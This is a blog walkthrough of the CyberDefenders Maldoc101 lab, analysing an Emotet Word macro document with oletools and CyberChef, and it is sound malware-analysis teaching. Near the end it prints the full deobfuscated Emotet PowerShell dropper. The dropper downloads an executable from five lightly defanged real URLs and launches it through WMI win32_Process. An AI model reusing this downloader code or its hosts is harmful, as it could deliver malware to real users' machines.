---
layout: post
author: remotephone
title:  "CyberDefenders.org - Maldoc101 Walkthrough"
date:   2021-04-12 23:40:00 -0600
categories: [lab, homelab, malware, malware, workflow]
largeimage: /images/avatar.jpg

---

# Another go at CyberDefenders.org

Having another go at a [CyberDefenders](https://cyberdefenders.org/) challenge, this one about maldocs. You can find a link to the challenge [here](https://cyberdefenders.org/labs/51).

## Environment

I did this through Windows Subsystem for Linux 2. I already have that environment installed and working, but any linux environment should give you a very similar path to follow what I did.

I also grabbed [oletools](https://github.com/decalage2/oletools) as this is the king of the maldoc analyzers. My install process followed the instructions on his page (slightly modified) to `pip3 install oletools --user` and I also separately grabbed oledump from [here](https://blog.didierstevens.com/programs/oledump-py/) as it wasn't included. Simply wget and unzipped it to my temporary working directory, which made a mess, but we only have one file we're working with so who's counting?

## Some notes

I appreciate them renaming this file to sample.bin so someone doesn't accidentally maldoc themselves. I am also just generally impressed at the experience on this site. Just sign up, go to a lab, and start plugging away. I'm currently downloading a 27gig macos forensics image and I'm surprised no one's charging me.

## Question 1: What streams contain macros in this document?

To know what they're asking for here, it helps to be familiar with the structure of the file. Yet again, back at Didier Steven's excellent documentation for info on that [here](https://olefile.readthedocs.io/en/latest/OLE_Overview.html).

His description is as follows:

~~~
An OLE file can be seen as a mini file system or a Zip archive: It contains streams of data that look like files embedded within the OLE file. Each stream has a name. For example, the main stream of a MS Word document containing its text is named “WordDocument”.

An OLE file can also contain storages. A storage is a folder that contains streams or other storages. For example, a MS Word document with VBA macros has a storage called “Macros”.

Special streams can contain properties. A property is a specific value that can be used to store information such as the metadata of a document (title, author, creation date, etc). Property stream names usually start with the character ‘\x05’ (ASCII code 5).
~~~

Ok that makes sense. Let's oledump the file. This is the truncated output

~~~bash
computer@computer: ~/gits/MalDoc101
$ python oledump.py sample.bin                                                                               [22:50:23]
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7119 '1Table'
  5:    101483 'Data'
  6:       581 'Macros/PROJECT'
  7:       119 'Macros/PROJECTwm'
  8:     12997 'Macros/VBA/_VBA_PROJECT'
  9:      2112 'Macros/VBA/__SRP_0'
 10:       190 'Macros/VBA/__SRP_1'
 11:       532 'Macros/VBA/__SRP_2'
 12:       156 'Macros/VBA/__SRP_3'
 13: M    1367 'Macros/VBA/diakzouxchouz'
 14:       908 'Macros/VBA/dir'
 15: M    5705 'Macros/VBA/govwiahtoozfaid'
 16: m    1187 'Macros/VBA/roubhaol'
<SNIP>
 ~~~

We can see 3 streams identified with M for macro i guess. We submit 13,15,16 and get our first flag.

## Question 2: What event is used to begin the execution of the macros? 

We can use olevba to break down this document in a way we can digest very easily. I pipe it to less because there is a lot of output and its good to start from the top. Right away, we see the function that's guilty, `Document_open`

~~~bash
olevba 0.56.1 on Python 3.8.5 - http://decalage.info/python/oletools
===============================================================================
FILE: sample.bin
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO diakzouxchouz.cls
in file: sample.bin - OLE stream: 'Macros/VBA/diakzouxchouz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Private Sub _
Document_open()
boaxvoebxiotqueb
End Sub
~~~

You can read more about that [here](https://docs.microsoft.com/en-us/office/vba/api/word.document.open) before submitting the flag.

## Question #3: Identify the malware family

We can get a hash of the file and see if Virustotal has seen it yet, it should be pretty quick if it has.

<https://www.virustotal.com/gui/file/d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee/detection>

Luck would have it, its already been uploaded, and this is Emotet.

## Question 4: What stream is responsible for the storage of the base64-encoded string? 

This one was honestly a guess for me. I tried olevba'ing it, I could see content was flagged as base64 encoded in the function `roubhaol` but I couldn't find the exact stream. I oledump'ed the file again and reviewed the output

~~~bash
 31:       110 'Macros/roubhaol/i09/i12/\x01CompObj'
 32:        40 'Macros/roubhaol/i09/i12/f'
 33:         0 'Macros/roubhaol/i09/i12/o'
 34:     15164 'Macros/roubhaol/i09/o'
 35:        48 'Macros/roubhaol/i09/x'
 36:       444 'Macros/roubhaol/o'
~~~

My guess here was the biggest section must have it, so 34 is your flag.

## Question 5: This document contains a user-form. Provide the name? 

Here, we can oledir the file to see all the parts of it, and browse it as a directory structure.

~~~bash
computer@computer: ~/gits/MalDoc101
$ oledir sample.bin                                                                                          [23:10:11]
oledir 0.54 - http://decalage.info/python/oletools
OLE directory entries in file sample.bin:
----+------+-------+----------------------+-----+-----+-----+--------+------
id  |Status|Type   |Name                  |Left |Right|Child|1st Sect|Size
----+------+-------+----------------------+-----+-----+-----+--------+------
0   |<Used>|Root   |Root Entry            |-    |-    |3    |F3      |10112
1   |<Used>|Stream |Data                  |-    |-    |-    |8       |101483
2   |<Used>|Stream |1Table                |1    |-    |-    |CF      |7119
<SNIP SNIP>
12  |    govwiahtoozfaid         |5705  |
11  |    roubhaol                |1187  |
17  |  roubhaol                  |-     |
41  |    \x01CompObj             |97    |
42  |    \x03VBFrame             |292   |
18  |    f                       |510   |
20  |    i05                     |-     |6E182020-F460-11CE-9BCD-00AA00608E01
    |                            |      |Forms.Frame
23  |      \x01CompObj           |112   |
21  |      f                     |44    |
22  |      o                     |0     |
24  |    i07                     |-     |6E182020-F460-11CE-9BCD-00AA00608E01
    |                            |      |Forms.Frame
27  |      \x01CompObj           |112   |
25  |      f                     |44    |
26  |      o                     |0     |
28  |    i09                     |-     |46E31370-3F7A-11CE-BED6-00AA00611080
    |                            |      |Forms.MultiPage
<SNIP SNIP>
~~~

Here, we can clearly see that `roubhaol` again is the interesting part of the document, and that is our flag. The Forms.Frame and Forms.Multipage are indicators of the user form being present.

## Question 6: This document contains an obfuscated base64 encoded string; what value is used to pad (or obfuscate) this string? 

Review the Suspicious string, this is a snippet of it.

~~~bash
�p2342772g3&*gs7712ffvs626fqo2342772g3&*gs7712ffvs626fqw2342772g3&*gs7712ffvs626fqe2342772g3&*gs7712ffvs626fqr2342772g3&*gs7712ffvs626fqs2342772g3&*gs7712ffvs626fqh2342772g3&*gs7712ffvs626fqeL2342772g3&*gs7712ffvs626fqL2342772g3&*gs7712ffvs626fq 2342772g3&*gs7712ffvs626fq-2342772g3&*gs7712ffvs626fqe2342772g3&*gs7712ffvs626fq JABsAG2342772g3&*gs7712ffvs626fqkAZQBj2342772g3&*gs7712ffvs626fqAGgAcg2342772g3&*gs7712ffvs626fqBvAHUA2342772g3&*gs7712ffvs626fqaAB3AH2342772g3&*gs7712ffvs626fqUAdwA92342772g3&*gs7712ffvs626fqACcAdg2342772g3&*gs7712ffvs626fqB1AGEA2342772g3&*gs7712ffvs626fqYwBkAG2342772g3&*gs7712ffvs626fq8AdQB22342772g3&*gs7712ffvs626fqAGMAaQ2342772g3&*gs7712ffvs626fqBvAHgA2342772g3&*gs7712ffvs626fqaABhAG2342772g3&*gs7712ffvs626fq8AbAAn2342772g3
~~~

What string do we see repeating? It's difficult to get it visually, but since we less'ed the output of olevba, we can search for the string. I know that `42772g3&` is going to be part of it, so if I start from the top of the doc and search down, we can see where that padding is split from the text.

~~~bash
feaxgeip = Split(geutyoeytiestheug, "2342772g3&*gs7712ffvs626fq")
~~~

## Question 7: What is the purpose of the base64 encoded string? 

These are always hard for me because I don't know exactly what the question wants. We can run the doc through `olevba sample.bin --reveal -a` which will give us the output we can work with, then take the very large text block that starts with `p2342772g3&*gs7...` and get that into cyber chef to deobfuscate it. This [recipe](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'2342772g3%26*gs7712ffvs626fq'%7D,'',true,false,false,false)) will remove the padding,

Finally, this [recipe](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'2342772g3%26*gs7712ffvs626fq'%7D,'',true,false,false,false)Find_/_Replace(%7B'option':'Regex','string':'powersheLL%20-e%20'%7D,'',true,false,true,false)From_Base64('A-Za-z0-9%2B/%3D',true)Remove_null_bytes()) will clean up the script, remove the `powersheLL -e` from the beginning, and decode the base64.

To know you're deobfuscating the correct string, it should start with `p234` and end with `fvs626fqA=`.

The flag ends up being the first word of the depadded script, powershell.

## Question 8: What WMI class is used to create the process to launch the trojan? 

Now that we have the deobfuscated script, it should look something like this (I changed every instance of http or https to hxxp or hxxps):

~~~bash
$liechrouhwuw='vuacdouvcioxhaol';[Net.ServicePointManager]::"SE`cuRiTy`PRO`ToC`ol" = 'tls12, tls11, tls';$deichbeudreir = '337';$quoadgoijveum='duuvmoezhaitgoh';$toehfethxohbaey=$env:userprofile+'\'+$deichbeudreir+'.exe';$sienteed='quainquachloaz';$reusthoas=.('n'+'ew-ob'+'ject') nEt.weBclIenT;$jacleewyiqu='hxxps://haoqunkong.com/bn/s9w4tgcjl_f6669ugu_w4bj/*hxxps://www.techtravel.events/informationl/8lsjhrl6nnkwgyzsudzam_h3wng_a6v5/*hxxp://digiwebmarketing.com/wp-admin/72t0jjhmv7takwvisfnz_eejvf_h6v2ix/*hxxp://holfve.se/images/1ckw5mj49w_2k11px_d/*hxxp://www.cfm.nl/_backup/yfhrmh6u0heidnwruwha2t4mjz6p_yxhyu390i6_q93hkh3ddm/'."s`PliT"([char]42);$seccierdeeth='duuzyeawpuaqu';foreach($geersieb in $jacleewyiqu){try{$reusthoas."dOWN`loA`dfi`Le"($geersieb, $toehfethxohbaey);$buhxeuh='doeydeidquaijleuc';If ((.('Get-'+'Ite'+'m') $toehfethxohbaey)."l`eNGTH" -ge 24751) {([wmiclass]'win32_Process')."C`ReaTe"($toehfethxohbaey);$quoodteeh='jiafruuzlaolthoic';break;$chigchienteiqu='yoowveihniej'}}catch{}}$toizluulfier='foqulevcaoj'
~~~

We can pretty easily see the wmiclass `win32_Process` and that's our next flag.

## Question 9: Multiple domains were contacted to download a trojan. Provide first FQDN as per the provided hint 

We can see above pretty easily the first domain, `haoqunkong[.]com`. Submit it without the square brackets and we're done.

## OK that's it, again

Good stuff yet again. I am enjoying the exercises and it's nice to keep sharp on this stuff. Free form answers are sometimes tricky with investigative questions, but usually its pretty obvious. I used the first hint (the ones that dont take any points away) a few times, but they usually didn't give me anything I could work with. Trial and error is your friend sometimes. Thanks for reading.
